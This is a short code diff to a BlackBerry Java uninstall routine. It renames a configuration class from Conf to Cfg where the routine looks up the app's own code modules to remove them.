@@ -14,7 +14,7 @@ import net.rim.device.api.system.CodeModuleManager;
 import blackberry.Main;
 import blackberry.Status;
 import blackberry.Trigger;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.config.ConfAction;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -132,7 +132,7 @@ public final class UninstallAction extends SubActionMain {
                 // Retrieve specific information about a module.
                 final String name = CodeModuleManager.getModuleName(handle);
 
-                if (name.startsWith(Conf.MODULE_NAME)) {
+                if (name.startsWith(Cfg.MODULE_NAME)) {
                     //#ifdef DEBUG
                     debug.warn("Removing handle: " + handle + " name: " + name);
                     //#endif
